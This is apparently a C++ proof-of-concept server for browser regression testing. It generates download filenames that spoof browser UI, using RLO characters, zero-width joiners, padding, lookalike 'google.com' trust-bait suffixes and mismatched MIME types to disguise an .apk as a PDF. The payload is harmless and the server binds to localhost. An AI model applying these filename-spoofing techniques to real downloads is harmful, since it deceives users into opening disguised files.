// filename: smart_spoof_download_poc.cpp
// C++ single-file HTTP server that serves an HTML lab page to exercise
// various filename spoofing patterns (server-driven via Content-Disposition,
// and client-driven via <a download> + Blob). Designed for regression testing
// of Chromium/Chrome/Edge filename/UI spoofing issues.
//
// Build (Linux/macOS):
//   g++ -std=c++17 -O2 smart_spoof_download_poc.cpp -o spoof_lab
// Run:
//   ./spoof_lab
// Open:
//   http://127.0.0.1:8080/
//
// Build (Windows/MSVC Dev Prompt):
//   cl /EHsc /std:c++17 smart_spoof_download_poc.cpp ws2_32.lib
//   spoof_lab.exe
//
// Notes:
// - The HTML UI lets you tweak filename base/ext, padding, suffix like
//   "From https∶⧸⧸google.com", MIME type mismatch, RLO/ZWJ trickery, etc.
// - Endpoints:
//   /                      -> HTML control panel
//   /server-download       -> returns attachment with Content-Disposition
//   /client-download       -> HTML page that triggers <a download> Blob
//   /payload               -> raw bytes body (served as chosen Content-Type)
//
// Security: For local testing only. Do not expose to untrusted networks.

#include <algorithm>
#include <cctype>
#include <cstdio>
#include <cstring>
#include <iostream>
#include <map>
#include <sstream>
#include <string>
#include <vector>

#ifdef _WIN32
  #include <winsock2.h>
  #include <ws2tcpip.h>
  #pragma comment(lib, "Ws2_32.lib")
  using socklen_t = int;
#else
  #include <sys/types.h>
  #include <sys/socket.h>
  #include <netinet/in.h>
  #include <arpa/inet.h>
  #include <unistd.h>
  #define INVALID_SOCKET (-1)
  #define SOCKET_ERROR   (-1)
  using SOCKET = int;
#endif

static void closesock(SOCKET s){
#ifdef _WIN32
  closesocket(s);
#else
  close(s);
#endif
}

static bool sendall(SOCKET s, const char* buf, size_t len){
  size_t total=0; while(total<len){ int n=send(s, buf+total, (int)(len-total), 0); if(n<=0) return false; total+=(size_t)n; } return true;
}

static std::string urldecode(const std::string& s){
  std::string o; o.reserve(s.size());
  for(size_t i=0;i<s.size();++i){
    if(s[i]=='%' && i+2<s.size()){
      auto hex = s.substr(i+1,2);
      int v = 0; std::stringstream ss; ss << std::hex << hex; ss >> v; o.push_back((char)v); i+=2;
    } else if(s[i]=='+') o.push_back(' ');
    else o.push_back(s[i]);
  }
  return o;
}

static std::map<std::string,std::string> parse_query(const std::string& q){
  std::map<std::string,std::string> m; size_t start=0; while(start<q.size()){ size_t amp=q.find('&',start); if(amp==std::string::npos) amp=q.size(); size_t eq=q.find('=',start); if(eq!=std::string::npos && eq<amp){ std::string k=urldecode(q.substr(start,eq-start)); std::string v=urldecode(q.substr(eq+1,amp-eq-1)); m[k]=v; } else { std::string k=urldecode(q.substr(start,amp-start)); m[k]=""; } start=amp+1; } return m;
}

static std::string html_escape(const std::string& s){
  std::string o; for(char c: s){ switch(c){ case '&': o += "&amp;"; break; case '<': o += "&lt;"; break; case '>': o += "&gt;"; break; case '"': o += "&quot;"; break; case '\'': o += "&#39;"; break; default: o.push_back(c); } } return o;
}

static std::string build_http_response(const std::string& status_line,
  const std::vector<std::pair<std::string,std::string>>& headers,
  const std::string& body){
  std::string resp = status_line+"\r\n";
  for(const auto& h: headers) resp += h.first+": "+h.second+"\r\n";
  resp += "Content-Length: "+std::to_string(body.size())+"\r\n\r\n";
  resp += body; return resp;
}

// ---------- Config helpers ----------
struct Config{
  std::string base = "importantbackupfilecontaininguserdataandsettingsforsystem";
  std::string ext = ".apk"; // dangerous-looking extension to test
  std::string mime = "application/pdf"; // intentional mismatch
  std::string suffix = "From https∶⧸⧸google.com"; // visual trust bait
  int pad_len = 60;
  char pad_char = '_';
  bool use_rlo = false;     // insert U+202E Right-To-Left Override before ext spoof
  bool use_zwj = false;     // sprinkle U+200D zero-width joiners
  bool dispo_inline = false; // Content-Disposition: inline vs attachment
  bool dispo_rfc5987 = true; // also send filename* param
  bool add_nosniff = false;  // X-Content-Type-Options: nosniff
};

static std::string repeat_char(char c, int n){ return std::string(std::max(0,n), c); }

static std::string sprinkle_zwj(const std::string& s){
  // Insert U+200D after every 3 chars to exercise rendering quirks
  const std::string ZWJ = "\xE2\x80\x8D"; // UTF-8
  std::string o; o.reserve(s.size()*2);
  int cnt=0; for(unsigned char ch: s){ o.push_back((char)ch); cnt++; if(cnt%3==0) o += ZWJ; }
  return o;
}

static std::string build_filename(const Config& c){
  std::string name = c.base;
  if(c.use_rlo){
    // U+202E followed by reversed fake extension text to test RTL spoofing
    const std::string RLO = "\xE2\x80\xAE"; // UTF-8
    std::string reversed_ext = std::string(c.ext.rbegin(), c.ext.rend());
    name += RLO + reversed_ext; // e.g., shows like ".pdf" visually though it's .apk
  } else {
    name += c.ext;
  }
  name += repeat_char(c.pad_char, c.pad_len);
  std::string sfx = c.suffix;
  if(c.use_zwj) sfx = sprinkle_zwj(sfx);
  name += sfx;
  return name;
}

static std::string safe_query_get(const std::map<std::string,std::string>& q, const std::string& k, const std::string& def){ auto it=q.find(k); return it==q.end()?def:it->second; }
static int query_int(const std::map<std::string,std::string>& q, const std::string& k, int def){ auto it=q.find(k); if(it==q.end()) return def; try{ return std::stoi(it->second);}catch(...){return def;} }
static bool query_bool(const std::map<std::string,std::string>& q, const std::string& k, bool def){ auto it=q.find(k); if(it==q.end()) return def; std::string v=it->second; std::transform(v.begin(), v.end(), v.begin(), ::tolower); return (v=="1"||v=="true"||v=="yes"||v=="on"); }

// ---------- HTML UI ----------
static std::string html_index(const Config& c){
  std::ostringstream o;
  std::string fname = build_filename(c);
  o << "<!doctype html><html><head><meta charset=\"utf-8\">\n";
  o << "<meta name=\"viewport\" content=\"width=device-width, initial-scale=1\">\n";
  o << "<title>Download Filename Spoofing Lab</title>\n";
  o << "<style>body{font-family:system-ui,Segoe UI,Arial,sans-serif;padding:24px;max-width:1000px;margin:auto}label{display:block;margin-top:10px}input,select{padding:8px;border:1px solid #ccc;border-radius:8px;width:100%}code{background:#f5f5f5;padding:2px 6px;border-radius:6px}button{padding:10px 16px;border:0;border-radius:10px;cursor:pointer;box-shadow:0 1px 3px rgba(0,0,0,.1)}.row{display:grid;grid-template-columns:1fr 1fr;gap:12px}.card{background:#fff;border:1px solid #eee;border-radius:16px;padding:16px;margin:12px 0;box-shadow:0 2px 10px rgba(0,0,0,.04)}.actions{display:flex;gap:12px;flex-wrap:wrap}.hint{color:#555;font-size:.9em}kbd{border:1px solid #ccc;border-bottom-color:#bbb;border-radius:4px;padding:2px 5px;background:#fafafa}</style>\n";
  o << "</head><body>\n<h1>Download Filename Spoofing Lab</h1>\n<p>Gunakan kontrol di bawah untuk membangkitkan variasi nama file, <code>Content-Type</code>, dan <code>Content-Disposition</code> guna menguji perilaku UI unduhan/Save As.</p>\n";

  o << "<div class=\"card\"><h3>Konfigurasi</h3><form id=cfg class=\"row\" action=\"#\" onsubmit=\"return false\">\n";
  o << "<label>Base name<input name=base value=\""<<html_escape(c.base)<<"\"></label>\n";
  o << "<label>Extension<input name=ext value=\""<<html_escape(c.ext)<<"\"></label>\n";
  o << "<label>MIME / Content-Type<input name=mime value=\""<<html_escape(c.mime)<<"\"></label>\n";
  o << "<label>Suffix (trust bait)<input name=suffix value=\""<<html_escape(c.suffix)<<"\"></label>\n";
  o << "<label>Pad length<input type=number name=pad_len value=\""<<c.pad_len<<"\"></label>\n";
  o << "<label>Pad char<input name=pad_char maxlength=1 value=\""<<c.pad_char<<"\"></label>\n";
  o << "<label><input type=checkbox name=use_rlo"<<(c.use_rlo?" checked":"")<<"> Use RLO (U+202E)</label>\n";
  o << "<label><input type=checkbox name=use_zwj"<<(c.use_zwj?" checked":"")<<"> Sprinkle ZWJ (U+200D)</label>\n";
  o << "<label><input type=checkbox name=dispo_inline"<<(c.dispo_inline?" checked":"")<<"> Content-Disposition: inline (default attachment)</label>\n";
  o << "<label><input type=checkbox name=dispo_rfc5987"<<(c.dispo_rfc5987?" checked":"")<<"> Send filename*</label>\n";
  o << "<label><input type=checkbox name=add_nosniff"<<(c.add_nosniff?" checked":"")<<"> Add X-Content-Type-Options: nosniff</label>\n";
  o << "</form>\n<p class=hint>Preview filename: <code id=preview">"<<html_escape(fname)<<"</code></p>\n</div>";

  o << "<div class=card><h3>Uji Seketika</h3><div class=actions>\n";
  o << "<button onclick=serverDownload()>Server-driven (Content-Disposition)</button>\n";
  o << "<button onclick=clientDownload()>Client-driven (&lt;a download&gt; + Blob)</button>\n";
  o << "<button onclick=both()>Bandingkan Keduanya</button>\n";
  o << "</div><p class=hint>Amati UI download list dan dialog Save As: apakah bagian belakang nama (mis. <code>From https∶⧸⧸google.com</code>) tampil dominan/menutupi ekstensi asli?</p></div>\n";

  o << R"( <script>
function qsel(){ const f=new FormData(document.getElementById('cfg')); const o={}; for(const [k,v] of f.entries()) o[k]=v; o.pad_len=parseInt(o.pad_len||'0'); o.use_rlo=!!f.get('use_rlo'); o.use_zwj=!!f.get('use_zwj'); o.dispo_inline=!!f.get('dispo_inline'); o.dispo_rfc5987=!!f.get('dispo_rfc5987'); o.add_nosniff=!!f.get('add_nosniff'); if(!o.pad_char) o.pad_char='_'; return o; }
function toQuery(o){ const p=new URLSearchParams(); for(const k in o){ let v=o[k]; if(typeof v==='boolean') v = v? '1':'0'; p.set(k, v); } return p.toString(); }
function serverDownload(){ const q=toQuery(qsel()); location.href='/server-download?'+q; }
function clientDownload(){ const q=toQuery(qsel()); window.open('/client-download?'+q,'_blank'); }
function both(){ serverDownload(); setTimeout(clientDownload, 300); }
</script> )";

  o << "</body></html>";
  return o.str();
}

static std::string client_html(const Config& c){
  std::ostringstream o; std::string fname = build_filename(c);
  o << "<!doctype html><html><head><meta charset=\"utf-8\"><title>Client Download</title>\n";
  o << "<style>body{font-family:system-ui;padding:24px}button{padding:10px 16px;border:0;border-radius:10px;cursor:pointer;box-shadow:0 1px 3px rgba(0,0,0,.1)}</style></head><body>";
  o << "<h2>Client-driven Download Test</h2><p>Nama file: <code>"<<html_escape(fname)<<"</code></p>";
  o << "<button id=go>Trigger Download</button><pre id=log></pre>\n";
  o << "<script>\nconst fname = "<<'"'<<html_escape(fname)<<'"'<<";\nconst mime = "<<'"'<<html_escape(c.mime)<<'"'<<";\nconst payload = '%PDF-1.4\n%Fake PDF content for PoC\n';\n\nfunction go(){\n  const blob = new Blob([payload], {type: mime});\n  const url = URL.createObjectURL(blob);\n  const a = document.createElement('a');\n  a.href = url; a.download = fname;\n  document.body.appendChild(a); a.click(); a.remove();\n  URL.revokeObjectURL(url);\n  document.getElementById('log').textContent = 'Triggered <a download> with '+fname+' (MIME '+mime+')';\n}\n document.getElementById('go').onclick=go;\n </script>";
  o << "</body></html>";
  return o.str();
}

static std::string content_disposition_value(const std::string& name, bool inline_disp, bool send_rfc5987){
  // Compose Content-Disposition with both filename and filename* (RFC 5987/6266)
  std::ostringstream d; d << (inline_disp?"inline":"attachment");
  // naive escaping for quotes/backslashes
  std::string quoted=name; for(char& c: quoted){ if(c=='\\' || c=='"') c='_'; }
  d << "; filename=\"" << quoted << "\"";
  if(send_rfc5987){
    // Percent-encode UTF-8 for filename*
    std::ostringstream enc; enc << "UTF-8''";
    for(unsigned char ch: name){
      if((ch>='0'&&ch<='9')||(ch>='A'&&ch<='Z')||(ch>='a'&&ch<='z')||ch=='-'||ch=='_'||ch=='.') enc<<ch;
      else { char buf[4]; std::snprintf(buf,sizeof(buf),"%%%02X",(int)ch); enc<<buf; }
    }
    d << "; filename*=" << enc.str();
  }
  return d.str();
}

static std::string build_payload_body(){
  return "%PDF-1.4\n%Fake PDF content for PoC\n"; // small, safe bytes
}

// ---------- Server loop ----------
int main(){
#ifdef _WIN32
  WSADATA wsa; if(WSAStartup(MAKEWORD(2,2), &wsa)!=0){ std::cerr<<"WSAStartup failed\n"; return 1; }
#endif

  SOCKET srv = socket(AF_INET, SOCK_STREAM, 0);
  if(srv==INVALID_SOCKET){ std::cerr<<"socket() failed\n"; return 1; }
  int opt=1;
#ifdef _WIN32
  setsockopt(srv, SOL_SOCKET, SO_REUSEADDR, (const char*)&opt, sizeof(opt));
#else
  setsockopt(srv, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt));
#endif
  sockaddr_in addr{}; addr.sin_family=AF_INET; addr.sin_addr.s_addr=inet_addr("127.0.0.1"); addr.sin_port=htons(8080);
  if(bind(srv,(sockaddr*)&addr,sizeof(addr))==SOCKET_ERROR){ std::cerr<<"bind() failed (port busy?)\n"; closesock(srv); return 1; }
  if(listen(srv,16)==SOCKET_ERROR){ std::cerr<<"listen() failed\n"; closesock(srv); return 1; }
  std::cout<<"[*] Open http://127.0.0.1:8080/\n";

  for(;;){
    sockaddr_in cli{}; socklen_t clen=sizeof(cli); SOCKET cs=accept(srv,(sockaddr*)&cli,&clen); if(cs==INVALID_SOCKET) continue;

    char buf[8192]; int n=recv(cs,buf,sizeof(buf)-1,0); if(n<=0){ closesock(cs); continue; } buf[n]='\0'; std::string req(buf);

    // Parse request line
    std::string method="GET", path="/", query=""; {
      size_t sp1=req.find(' '); size_t sp2=req.find(' ', sp1==std::string::npos?0:sp1+1);
      if(sp1!=std::string::npos && sp2!=std::string::npos){ std::string url=req.substr(sp1+1, sp2-sp1-1); size_t qpos=url.find('?'); if(qpos==std::string::npos) path=url; else { path=url.substr(0,qpos); query=url.substr(qpos+1);} }
    }

    auto q = parse_query(query);
    Config cfg; // defaults
    cfg.base       = safe_query_get(q, "base", cfg.base);
    cfg.ext        = safe_query_get(q, "ext", cfg.ext);
    if(!cfg.ext.empty() && cfg.ext[0] != '.') cfg.ext = "." + cfg.ext; // normalize
    cfg.mime       = safe_query_get(q, "mime", cfg.mime);
    cfg.suffix     = safe_query_get(q, "suffix", cfg.suffix);
    cfg.pad_len    = query_int(q, "pad_len", cfg.pad_len);
    {
      std::string pc = safe_query_get(q, "pad_char", std::string(1,cfg.pad_char));
      cfg.pad_char = pc.empty()? '_' : pc[0];
    }
    cfg.use_rlo       = query_bool(q, "use_rlo", cfg.use_rlo);
    cfg.use_zwj       = query_bool(q, "use_zwj", cfg.use_zwj);
    cfg.dispo_inline  = query_bool(q, "dispo_inline", cfg.dispo_inline);
    cfg.dispo_rfc5987 = query_bool(q, "dispo_rfc5987", cfg.dispo_rfc5987);
    cfg.add_nosniff   = query_bool(q, "add_nosniff", cfg.add_nosniff);

    if(path == "/" || path=="/index.html"){
      std::string body = html_index(cfg);
      auto resp = build_http_response("HTTP/1.1 200 OK", {{"Content-Type","text/html; charset=utf-8"},{"Cache-Control","no-store"}}, body);
      sendall(cs, resp.c_str(), resp.size());
    }
    else if(path == "/client-download"){
      std::string body = client_html(cfg);
      auto resp = build_http_response("HTTP/1.1 200 OK", {{"Content-Type","text/html; charset=utf-8"},{"Cache-Control","no-store"}}, body);
      sendall(cs, resp.c_str(), resp.size());
    }
    else if(path == "/server-download"){
      std::string filename = build_filename(cfg);
      std::string dispo = content_disposition_value(filename, cfg.dispo_inline, cfg.dispo_rfc5987);
      std::string payload = build_payload_body();
      std::vector<std::pair<std::string,std::string>> headers = {
        {"Content-Type", cfg.mime},
        {"Content-Disposition", dispo},
        {"Cache-Control", "no-store"}
      };
      if(cfg.add_nosniff) headers.push_back({"X-Content-Type-Options","nosniff"});
      auto resp = build_http_response("HTTP/1.1 200 OK", headers, payload);
      sendall(cs, resp.c_str(), resp.size());
    }
    else if(path == "/payload"){
      std::string payload = build_payload_body();
      auto resp = build_http_response("HTTP/1.1 200 OK", {{"Content-Type", safe_query_get(q,"mime","application/octet-stream")},{"Cache-Control","no-store"}}, payload);
      sendall(cs, resp.c_str(), resp.size());
    }
    else {
      std::string body = "Not Found";
      auto resp = build_http_response("HTTP/1.1 404 Not Found", {{"Content-Type","text/plain; charset=utf-8"}}, body);
      sendall(cs, resp.c_str(), resp.size());
    }

    closesock(cs);
  }

  closesock(srv);
#ifdef _WIN32
  WSACleanup();
#endif
  return 0;
}
